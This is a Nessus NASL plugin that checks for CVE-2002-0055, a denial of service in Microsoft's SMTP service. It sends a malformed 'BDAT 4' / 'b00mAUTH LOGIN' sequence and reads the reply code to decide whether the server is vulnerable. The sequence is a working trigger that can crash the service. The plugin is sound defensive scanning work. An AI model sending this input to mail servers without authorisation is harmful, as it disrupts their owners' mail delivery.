#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10885);
 script_bugtraq_id(4204);
 script_cve_id("CVE-2002-0055");
 script_version ("$Revision: 1.19 $");
 name["english"] = "MS SMTP DoS";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote SMTP server fail
and restart by sending it malformed input.

The service will restart automatically, but all the connections
established at the time of the attack will be dropped.

An attacker may use this flaw to make mail delivery to your site
less efficient.


Solution : http://www.microsoft.com/technet/security/bulletin/MS02-012.mspx
Risk factor : Medium";


 script_description(english:desc["english"]);
		    
 
 summary["english"] = "Checks if the remote SMTP server can be restarted";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
 
 family["english"] = "SMTP problems";
 family["francais"] = "Problèmes SMTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("smtpserver_detect.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#


include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 data = smtp_recv_banner(socket:soc); 
 crp = string("HELO example.com\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:1024);
 if(!(ereg(pattern:"^250 .* Hello .*", string:data)))exit(0);
 
 
 crp = string("MAIL FROM: nessus@nessus.org\r\n");
 
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:1024);
 crp = string("RCPT TO: Administrator\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:1024);
 crp = string("BDAT 4\r\n");
 send(socket:soc, data:crp);
 crp = string("b00mAUTH LOGIN\r\n");
 send(socket:soc, data:crp);
 r = recv_line(socket:soc, length:255);
 if(ereg(pattern:"^250 .*", string:r))
 {
 r = recv_line(socket:soc, length:5);
 
 
 # Patched server say : "503 5.5.2 BDAT Expected"
 # Vulnerable servers say : "334 VXNlcm5hbWU6"
 if(ereg(pattern:"^334 .*",string:r))
 		security_warning(port);
 }
  send(socket:soc, data:string("QUIT\r\n"));
  close(soc);
  exit(0);	     
}
